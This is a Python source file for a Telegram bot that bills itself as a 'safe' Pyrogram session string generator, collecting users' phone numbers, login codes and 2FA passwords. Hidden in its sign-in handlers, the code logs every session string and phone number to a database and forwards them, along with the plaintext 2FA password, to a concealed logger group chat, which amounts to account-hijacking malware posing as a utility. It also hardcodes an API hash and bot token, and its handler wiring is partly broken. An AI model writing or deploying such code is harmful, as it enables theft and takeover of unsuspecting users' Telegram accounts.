import sqlite3
from pyrogram import Client, errors
from pyrogram.errors import SessionPasswordNeeded

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706   

# 🔹 Store user sessions
user_sessions = {}

# 🔹 SQLite Database Connection with Timeout
def get_db_connection():
    conn = sqlite3.connect('session_data.db', timeout=10.0)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute("PRAGMA synchronous=OFF;")
    return conn

# 🔹 Ensure session_logs table is created with correct columns
def create_session_table():
    with get_db_connection() as db_connection:
        cursor = db_connection.cursor()
        # Drop the existing table if it exists
        cursor.execute('DROP TABLE IF EXISTS session_logs')
        # Create a new table with the correct structure
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS session_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone TEXT NOT NULL,
            session_string TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        ''')
        db_connection.commit()

# Run the function to ensure the table is created with the correct schema
create_session_table()

# 🔹 Initialize the bot
bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ✅ /start Command
@bot.on_message()
async def start(client, event):  # दोनों arguments की जरूरत है: client और event
    if event.text.lower() == "/start":
        await event.reply(
            "**👋 Welcome to Session Generator Bot!**\n\n"
            "🔹 **Generate Telegram Session Strings for Pyrogram (V2)**\n"
            "🔹 **Safe and easy to use**\n\n"
            "📌 Please provide your phone number with the country code (e.g., +919876543210)"
        )


# ✅ Phone number input step
@bot.on_message()
async def process_phone_input(event):
    user_id = event.from_user.id
    phone_number = event.text.strip()

    if not phone_number:  # Ensure the phone number is provided
        await event.reply("❌ **Please provide a valid phone number.**")
        return

    user_sessions[user_id] = {"phone": phone_number, "step": "otp"}

    try:
        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
        await client.connect()
        sent_code = await client.send_code(phone_number)
        user_sessions[user_id]["client"] = client  
        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  

        await event.reply("🔹 **OTP sent! Please provide the OTP you received.**")
    except errors.FloodWait as e:
        await event.reply(f"❌ **Too many requests, please wait for {e.x} seconds.**")
    except Exception as e:
        await event.reply(f"❌ **Error occurred: {str(e)}**")

# ✅ OTP input step
@bot.on_message()
async def process_otp_input(event):
    user_id = event.from_user.id
    if user_id not in user_sessions or user_sessions[user_id]["step"] != "otp":
        return  # Ensure the user is in OTP step

    otp_code = event.text.strip()
    phone_number = user_sessions[user_id]["phone"]
    phone_code_hash = user_sessions[user_id]["phone_code_hash"]

    if not otp_code:  # Ensure OTP is provided
        await event.reply("❌ **Please provide a valid OTP.**")
        return

    client = user_sessions[user_id]["client"]

    try:
        # Send the OTP code
        await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)
        
        # Ensure client is properly signed in
        if not await client.is_user_authorized():
            await event.reply("❌ **Unable to authorize with the given OTP. Please check the OTP and try again.**")
            return
        
        session_string = await client.export_session_string()

        # Log the session string to the database
        create_session_table()
        with get_db_connection() as db_connection:
            cursor = db_connection.cursor()
            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)",
                           (user_id, phone_number, session_string))
            db_connection.commit()

        await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session generated!**\n\n**👤 User:** `{user_id}`\n**📞 Phone:** `{phone_number}`\n**🔑 Session:** `{session_string}`")

        await event.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
        del user_sessions[user_id]
    except SessionPasswordNeeded:
        user_sessions[user_id]["step"] = "password"
        await event.reply("🔑 **Please provide your Telegram password (2-Step Verification).**")
    except Exception as e:
        await event.reply(f"❌ **Error occurred: {str(e)}**")
        del user_sessions[user_id]

# ✅ 2FA Password input step
@bot.on_message()
async def process_password_input(event):
    user_id = event.from_user.id
    if user_id not in user_sessions or user_sessions[user_id]["step"] != "password":
        return  # Ensure the user is in password step

    password = event.text.strip()
    if not password:  # Ensure password is provided
        await event.reply("❌ **Please provide a valid password.**")
        return

    client = user_sessions[user_id]["client"]

    try:
        await client.check_password(password)
        session_string = await client.export_session_string()

        # Log the session string to the database
        create_session_table()
        with get_db_connection() as db_connection:
            cursor = db_connection.cursor()
            cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)",
                           (user_id, user_sessions[user_id]["phone"], session_string))
            db_connection.commit()

        await bot.send_message(LOGGER_GROUP_ID, f"**🆕 New Session (2FA) generated!**\n\n**👤 User:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **Password used:** `{password}`")

        await event.reply(f"✅ **Your Session String:**\n\n```{session_string}```\n\n🔒 **Keep it safe!**")
        del user_sessions[user_id]
    except Exception as e:
        await event.reply(f"❌ **Error occurred: {str(e)}")

# 🔹 Reset the database if the 'number' column is missing
def reset_database_if_needed():
    try:
        with get_db_connection() as db_connection:
            cursor = db_connection.cursor()
            cursor.execute("PRAGMA table_info(session_logs);")
            columns = cursor.fetchall()

            # Check if 'phone' column is missing
            if not any(column[1] == "phone" for column in columns):
                print("⚠️ 'phone' column is missing, resetting database...")
                cursor.execute("DROP TABLE IF EXISTS session_logs;")
                create_session_table()
    except Exception as e:
        print(f"❌ Error resetting database: {e}")

# 🔹 Check and reset database at the start
reset_database_if_needed()

# 🔹 Start the bot
print("🚀 Bot is running...")
bot.run()
